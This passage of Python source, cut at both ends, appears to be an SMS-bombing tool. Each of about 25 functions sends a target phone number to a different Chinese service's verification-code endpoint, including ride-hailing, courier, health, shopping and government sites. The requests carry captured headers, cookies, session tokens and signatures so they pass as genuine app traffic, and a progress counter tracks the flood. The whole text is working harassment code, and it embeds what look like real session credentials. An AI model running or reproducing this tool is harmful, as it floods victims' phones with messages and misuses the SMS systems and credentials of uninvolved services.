        'Connection': 'keep-alive',
        'Content-Length': '243',
        'xweb_xhr': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11581',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wxeb0948c3bc004f93/24/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    data4 = {
        'country_code': '86',
        'mobile': phone,
        'classifier': 'login',
        'device_id': 'oPgfE62SRLyPt-MLYg8zJyupZ7ng',
        'terminal': '{"name":"微信小程式-windows","model":"microsoft"}',
        'wechat_app_id': 'wxeb0948c3bc004f93'
    }
    try:
        requests.post(url4, headers=headers4, data=data4, timeout=5)
    finally:
        update_progress()

def request_url5(phone):
    url5 = 'https://api666.xfb315.cn/auth/send_sms'
    headers5 = {
        'Host': 'api666.xfb315.cn',
        'Connection': 'keep-alive',
        'Content-Length': '23',
        'version': '10.0.3',
        'xweb_xhr': '1',
        'source': 'miniprogram',
        'Authorization': 'bearer',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11581',
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wx899e26f0d5e313c0/219/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    data5 = {'phone': phone}
    try:
        requests.post(url5, headers=headers5, json=data5, timeout=5)
    finally:
        update_progress()

def request_url6(phone):
    url6 = 'https://muguntools.com/api/sms/send'
    headers6 = {
        'Host': 'muguntools.com',
        'Connection': 'keep-alive',
        'Content-Length': '135',
        'version': '1.1.2',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11581',
        'Content-Type': 'application/json',
        'xweb_xhr': '1',
        'device': 'windows',
        'openid': 'oWikI7Tys7eVJJCZ9DbkkE-hjxfE',
        'brand': 'microsoft',
        'platform': 'wxMiniProgram',
        'os': 'windows',
        'vcode': '112',
        'modal': 'microsoft',
        'unionid': 'opYUb6lUjDJFbI_K3QtJxkpk2ntE',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wx38127f9d5d66391d/7/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    data6 = {
        "mobile": phone,
        "code": "",
        "openid": "oWikI7Tys7eVJJCZ9DbkkE-hjxfE",
        "unionid": "opYUb6lUjDJFbI_K3QtJxkpk2ntE",
        "provider": "weixin"
    }
    try:
        requests.post(url6, headers=headers6, json=data6, timeout=5)
    finally:
        update_progress()

def request_url7(phone):
    url7 = 'https://passport.uucin.com/accounts/send_login_mobile_captcha'
    headers7 = {
        'Host': 'passport.uucin.com',
        'Connection': 'keep-alive',
        'Content-Length': '18',
        'Accept': 'application/JSON',
        'xweb_xhr': '1',
        'X-CLIENT-ID': 'Yjg2NWE1YTI3M2YyNDlhZjg1NjkzYmIyMGUxYTcwN2I=',
        'Authorization': 'token undefined',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11581',
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wxb3b23f913746f653/180/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    data7 = f'mobile={phone}'
    try:
        requests.post(url7, headers=headers7, data=data7, timeout=5)
    finally:
        update_progress()

def request_url8(phone):
    url8 = 'https://www.sohochinaoffice.com/api/mini-login/send-verify-code'
    headers8 = {
        'Host': 'www.sohochinaoffice.com',
        'Connection': 'keep-alive',
        'Accept': 'application/json, text/plain, */*',
        'xweb_xhr': '1',
        'X-Requested-With': 'XMLHttpRequest',
        'Cookie': 'acw_tc=b65cfd3b17365814882984990e5597abfcb6a4670a24c6837e4ae0424fc03a; SERVERID=cd790e86ab36d7aeaa540053e806f51f|1736581541|1736581488; soho_lang=zch',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11581',
        'Content-Type': 'application/json',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wx6cfaabec28e23bdb/106/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    params8 = {
        'mobile': phone,
        'currtime': '1736581543',
        'sign': '5346ae7ab6d8b8c7f2af25f0e753424d'
    }
    try:
        requests.get(url8, headers=headers8, params=params8, timeout=5)
    finally:
        update_progress()

def request_url9(phone):
    url9 = 'https://rt.taihulidian.com/appapi/?r=user/verify-code&appid=wxbdc2473d8e16d081&phone=' + phone + '&token=&v=4.1.20250102'
    headers9 = {
        'Host': 'rt.taihulidian.com',
        'Connection': 'keep-alive',
        'xweb_xhr': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11581',
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wxbdc2473d8e16d081/10/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    data9 = {}
    try:
        requests.get(url9, headers=headers9, json=data9, timeout=5)
    finally:
        update_progress()

def request_url10(phone):
    url10 = 'https://api.zxw.xinchengzxw.com/sms/send_code'
    headers10 = {
        'Host': 'api.zxw.xinchengzxw.com',
        'Connection': 'keep-alive',
        'Content-Length': '39',
        'xweb_xhr': '1',
        'Authorization': '',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11581',
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wx8e1824314fc6e636/35/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    data10 = {
        "mobile": phone,
        "type": "login"
    }
    try:
        requests.post(url10, headers=headers10, json=data10, timeout=5)
    finally:
        update_progress()

def request_url11(phone):
    url11 = 'https://prod.driver.yunzhukj.cn/terminal/api/basics/sendMobileCode'
    headers11 = {
        'Host': 'prod.driver.yunzhukj.cn',
        'Connection': 'keep-alive',
        'Content-Length': '94',
        'X-Nideshop-Token': '',
        'xweb_xhr': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11581',
        'token': '',
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wx70fbb72dd32f14f6/95/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    data11 = {
        "mobile": phone,
        "openId": "oCoHa5BPKmmNt0i5YNY-gA_Xrrio",
        "sendType": "registerS-kQZWzK"
    }
    try:
        requests.post(url11, headers=headers11, json=data11, timeout=5)
    finally:
        update_progress()

def request_url12(phone):
    url12 = 'https://api.wfjec.com/mall/user/sendRegisterSms'
    headers12 = {
        'Host': 'api.wfjec.com',
        'Connection': 'keep-alive',
        'Content-Length': '24',
        'wuhash': 'oyimt5AAwbh-HGJsmHZ5iUkUdaRg',
        'xweb_xhr': '1',
        'locale': 'zh_CN',
        'appid': 'wxf9cbb6c11bdbef46',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11581',
        'Content-Type': 'application/json;charset=UTF-8',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wxf9cbb6c11bdbef46/129/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    data12 = {'mobile': phone}
    try:
        requests.put(url12, headers=headers12, json=data12, timeout=5)
    finally:
        update_progress()

def request_url13(phone):
    url13 = 'https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code'
    headers13 = {
        'Host': 'mobilev2.atomychina.com.cn',
        'Connection': 'keep-alive',
        'Content-Length': '68',
        'pragma': 'no-cache',
        'design-site-locale': 'zh-CN',
        'Accept-Language': 'zh-CN',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11581',
        'X-HTTP-REQUEST-DOMAIN': 'mobilev2.atomychina.com.cn',
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'cache-control': 'no-cache',
        'xweb_xhr': '1',
        'x-requested-with': 'XMLHttpRequest',
        'cookie': 'acw_tc=0bd17c2e17365798534368197ec4bcd9dfdbd0753d4dd1dbd1e234122ab964; guestId=59375b92-e0e5-464a-8dc8-541daed91a4d; 11 Jan 2026 07:17:33 GMT; guestId.sig=KuVQtEXvkK11u1CJ_yuzmwwHMsI; 11 Jan 2026 07:17:35 GMT; 11 Jan 2026 07:17:36 GMT',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wx74d705d9fabf5b77/128/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br'
    }
    data13 = {
        "mobile": phone,
        "captcha": "1111",
        "token": "1111",
        "prefix": 86
    }
    try:
        requests.post(url13, headers=headers13, json=data13, timeout=5)
    finally:
        update_progress()

def request_url14(phone):
    url14 = f'https://shopapi.cadf.top/user-center/frontend/user/login/getVerifyCode?mobile={phone}&smsType=phoneLogin&parentId=&client=miniapp&sid=1857383252235206657'
    headers14 = {
        'Host': 'shopapi.cadf.top',
        'Connection': 'keep-alive',
        'xweb_xhr': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11581',
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wx9ea65924fe0e5adf/23/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    try:
        requests.get(url14, headers=headers14, timeout=5)
    finally:
        update_progress()

def request_url15(phone):
    url15 = 'https://epassport.diditaxi.com.cn/passport/login/v5/codeMT'
    headers15 = {
        'Host': 'epassport.diditaxi.com.cn',
        'Connection': 'keep-alive',
        'Content-Length': '409',
        'xweb_xhr': '1',
        'Mpxlogin-Ver': '5.4.33',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11177',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wx38caf7d88d88b757/45/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    data15 = f'q=%7B%22api_version%22:%221.0.1%22,%22appid%22:121015,%22role%22:2470,%22device_name%22:%22microsoft%22,%22sec_session_id%22:%223dggIrn4e96Bc7F3d3NSHAN5v8qeqSYyvpOQqkGVnSTGqW5Dcd8NXJbXGHumbI23%22,%22policy_id_list%22:[],%22policy_name_list%22:[],%22ddfp%22:%22%22,%22lang%22:%22zh-CN%22,%22wsgenv%22:%22%22,%22cell%22:%22{phone}%22,%22country_calling_code%22:%22%2B86%22,%22code_type%22:1,%22scene%22:1%7D'
    try:
        requests.post(url15, headers=headers15, data=data15, timeout=5)
    finally:
        update_progress()

def request_url16(phone):
    url16 = 'https://api.ky-express.com/router/rest?web.login.verification.sendSmsCode'
    headers16 = {
        'Host': 'api.ky-express.com',
        'Connection': 'keep-alive',
        'Content-Length': '100',
        'appkey': '80013',
        'xweb_xhr': '1',
        'method': 'web.login.verification.sendSmsCode',
        'x-risk-version': 'captcha',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11581',
        'clientVersion': '7.60.0',
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wxaf9417914179d465/679/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    data16 = {
        "captchaType": 7,
        "phone": phone,
        "from": 6,
        "deviceCode": "2356c1be-e86f-4785-b131-baba182463a8"
    }
    try:
        requests.post(url16, headers=headers16, json=data16, timeout=5)
    finally:
        update_progress()

def request_url17(phone):
    url17 = 'https://www.deppon.com/ndcc-gwapi/messageService/eco/message/sendSmsMessage'
    headers17 = {
        'Host': 'www.deppon.com',
        'Connection': 'keep-alive',
        'Content-Length': '70',
        'xweb_xhr': '1',
        'conrent-type': 'application/json; charset=UTF-8',
        'Cookie': 'ECO_TOKEN=D8587E606BDCB6968956356D1E08373B;',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11581',
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wxa1ebeeb0ed47f0b2/873/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    data17 = {
        "messageType": "login",
        "mobile": phone,
        "sysCode": "WECHAT_MINI"
    }
    try:
        requests.post(url17, headers=headers17, json=data17, timeout=5)
    finally:
        update_progress()

def request_url18(phone):
    url18 = 'https://cl-gateway.tuhu.cn/cl-user-auth-login/login/getVerifyCode'
    headers18 = {
        'Host': 'cl-gateway.tuhu.cn',
        'Connection': 'keep-alive',
        'Content-Length': '89',
        'authType': 'oauth',
        'deviceId': '1736598239531-9591733-08f152b08dd7b5-63368555',
        'api_level': '2',
        'Authorization': 'Bearer',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11581',
        'Content-Type': 'application/json',
        'distinct_id': '1736598239445-3964456-0ea9f5fce9a5c9-31116122',
        'platformSource': 'uni-app',
        'xweb_xhr': '1',
        'currentPage': 'loginPackage/pages/login/login',
        'channel': 'wechat-miniprogram',
        'blackbox': 'gMPHB1736598344Ef8jrwm2ym0',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wx27d20205249c56a3/1015/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    data18 = {
        "mobile": phone,
        "channel": "wechat-miniprogram",
        "channelType": 0,
        "nationCode": "86"
    }
    try:
        requests.post(url18, headers=headers18, json=data18, timeout=5)
    finally:
        update_progress()

def request_url19(phone):
    url19 = "https://12345lm.www.yn.gov.cn:9001/WebPortal/Api/BanJian/SendValidateSmsCodeForWeChat"
    headers19 = {
        "Host": "12345lm.www.yn.gov.cn:9001",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://12345lm.www.yn.gov.cn:9001",
        "Accept-Language": "zh-cn",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Referer": "https://12345lm.www.yn.gov.cn:9001/gov/WoYaoFanYing.html?",
        "Content-Length": "47",
        "X-Requested-With": "XMLHttpRequest"
    }
    data19 = {
        "mobile": phone,
        "sid": "PyiYE2JNv_ul25jNu-fPrDaS"
    }
    try:
        requests.post(url19, headers=headers19, data=data19, timeout=5)
    finally:
        update_progress()

def request_url20(phone):
    url20 = f"https://12345.bosslaw.cn/qzxf/12345/wx/getCode?phone={phone}"
    headers20 = {
        "Host": "12345.bosslaw.cn",
        "Origin": "https://12345.bosslaw.cn",
        "Accept-Encoding": "gzip, deflate, br",
        "Cookie": "JSESSIONID=46123E19A9D4FBA0122D305FA60CE12D",
        "Content-Length": "0",
        "Connection": "keep-alive",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Referer": "https://12345.bosslaw.cn/qzxf/12345/wx/appeal?sqlxId=1&cityId=&streetId=",
        "Accept-Language": "zh-cn",
        "X-Requested-With": "XMLHttpRequest"
    }
    data20 = {}
    try:
        requests.post(url20, headers=headers20, data=data20, timeout=5)
    finally:
        update_progress()

def request_url21(phone):
    url21 = "http://jkzn.zdjk.tv/api/medical-login/login/send/sms"
    headers21 = {
        "Host": "jkzn.zdjk.tv",
        "Accept": "application/json",
        "identification": "odtWX5g2h26ZG8wYuFlR94ciQSG4",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-cn",
        "Content-Type": "application/json",
        "Origin": "http://jkzn.zdjk.tv",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Connection": "keep-alive",
        "Referer": "http://jkzn.zdjk.tv/login?redirect=/",
        "Content-Length": "23"
    }
    data21 = {
        "phone": phone
    }
    try:
        requests.post(url21, headers=headers21, data=json.dumps(data21), timeout=5)
    finally:
        update_progress()

def request_url22(phone):
    url22 = "https://hmb.webao99.com/newbeijing/api/prologue/user/acquireCaptcha"
    headers22 = {
        "Content-Type": "application/json;charset=utf-8",
        "Origin": "https://hmb.webao99.com",
        "Accept-Encoding": "gzip, deflate, br",
        "Cookie": "newbeijing=OTg4N2EwOTctMjkxZS00MmYwLWFjZDgtMDhhYzJkNmQzZmI3",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Referer": "https://hmb.webao99.com/newbeijing/?code=071fSnFa1xsnwH0nTbIa1AUh0H2fSnFN&state=null",
        "Content-Length": "23",
        "Accept-Language": "zh-cn"
    }
    data22 = {"phone": phone}
    try:
        requests.post(url22, json=data22, headers=headers22, timeout=5)
    finally:
        update_progress()

def request_url23(phone):
    url23 = "https://centerapi.qschou.com/passport/common/sms/send"
    headers23 = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Platform": "qsc_h5/0.1.0",
        "Content-Type": "application/json; charset=UTF-8",
        "Origin": "https://m.qshealth.com",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Connection": "keep-alive",
        "Qsc-Token": "3ef465aa925ff4467bda2bcc2a0087ceec2eb838",
        "Referer": "https://m.qshealth.com/",
    }
    data23 = {
        "out": True,
        "auth_key": "jb_wxh5_qsjk",
        "verify_code_scene": "bind_phone",
        "country_code": "CN",
        "phone": phone,
        "out_mode": ["phone-text"],
        "pic_code": ""
    }
    try:
        requests.post(url23, json=data23, headers=headers23, timeout=5)
    finally:
        update_progress()

def request_url24(phone):
    url24 = "https://weixin.ngarihealth.com/weixin/wx/mp/wx870abf50c6bc6da3/gateway"
    headers24 = {
        "Host": "weixin.ngarihealth.com",
        "Cookie": "api=WX; client-id=165070796; isNewUser=true; wx-appid=wx870abf50c6bc6da3; wx-openid=oeSjtw2qrOmReRH9wkkan-i6eVss; wx870abf50c6bc6da3=%7B%22token%22%3A%22%22%2C%22clientId%22%3A165070796%2C%22appkey%22%3A%22%22%7D; acw_tc=2f624a0b17168265021237094e28e7bc2a5f3e4e30d236e9272724103a6d67",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "X-Ca-Timestamp": "1716826531160",
        "X-Region": "",
        "X-Ca-Key": "ngari-wx",
        "X-Content-MD5": "QBg78ZbPEgJJJusq1RTYkw==",
        "Referer": "https://weixin.ngarihealth.com/weixin/wx/mp/wx870abf50c6bc6da3/index.html?code=001uhIkl2Z0jwd4hUcml2R9GtY3uhIkZ&state=STATE",
        "X-Service-Id": "eh.unLoginSevice",
        "X-Service-Method": "sendPatientWxRegisterVCodeNew",
        "Origin": "https://weixin.ngarihealth.com",
        "X-Client-Id": "165070796",
        "Content-Length": "15",
        "encoding": "utf-8",
        "Connection": "keep-alive",
        "X-Entrance": "WX@ngari-health@wx870abf50c6bc6da3",
        "X-Ca-Nonce": "edbf0b86f5364435a3644471b86b309800000030",
        "Accept-Language": "zh-cn",
        "X-Client-Source": "eh.wx.health.login.RegisterNew",
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "X-Ca-Signature": "buChE2v7F4NWQO4JTqrkGVOGe704P0+zlrnq58mHJCI=",
    }
    data24 = [phone]
    try:
        requests.post(url24, json=data24, headers=headers24, timeout=5)
    finally:
        update_progress()

def request_url25(phone):
    url25 = "https://m.120.net/free/new_send"
    headers25 = {
        "Host": "m.120.net",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "zh-cn",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://m.120.net",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Connection": "keep-alive",
        "Referer": "https://m.120.net/free",
        "Content-Length": "29",
        "Cookie": "access_date=20240528; all_uv=20240528; authorization=eyJhbGciOiJSUzI1NiIsInR5cGUiOiJKV1QifQ.eyJhcHBpZCI6Ind4YzZlNTg2ZDVhZjM5OGQ5MSIsImlzcyI6IkhlYWx0aCBjbG91ZCIsImlhdCI6MTcxNjgyNzYwNSwiZXhwIjoxNzE5NDE5NjA1LCJmdHMiOjE3MTY4Mjc2MDV9.qram62yykIx1HR6GH3KqXGqaIyC2t7KPh93eGJTPzrLD05IR59W368-taZfkH5xClB7IMurowkpsJd8BWbW4D48Iy2Q-iUY2JT8guWqaYieNyAuM8IMi8AElasb8C4oRS2_OYIT8MoO-ajsplqpoFN-76AQzGWolui1x_rIMNiA; retoken=Px8W2C_aPHqQHasqeQCDyePypLciHNmvS4opQiRwQ9UNBvkQugOr2NwJDat049KZgEv1k2GywULQqjQU7HzqCwmoooLpgAdmAeOt9SoP5q2R8KnuLYQJOMQCi5iO61vse8KDM6YlrmvMJQQKXPrkd1FEQdsDPL3qFQ_lC60T6tA; ucaskdoc_uuid=37af683e467cd846; userinfo=bY%2B76j8zWdlgSFigCTbZir9Q4VuZh3PPWJwBvoQH8J8%3D; __jsluid_s=6fe92db569d15b7cb82753ed45cbec05"
    }
    data25 = {
        "account": phone,
        "type": "fast"
    }
    try:
        requests.post(url25, headers=headers25, data=data25, timeout=5)
    finally:
        update_progress()


def send_dxmbaoxian_sms(mobile):
    try:
        url = "https://www.dxmbaoxian.com/juhe/insurface/consultant/sendVerificationCode"
        
        headers = {
            "Host": "www.dxmbaoxian.com",
            "Connection": "keep-alive",
            "Content-Length": "311",
            "sec-ch-ua-platform": "\"Android\"",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wxdde36ae788f0bd5c",
            "Accept": "application/json, text/plain, */*",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "Content-Type": "application/json;charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://www.dxmbaoxian.com",
            "X-Requested-With": "com.tencent.mm",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
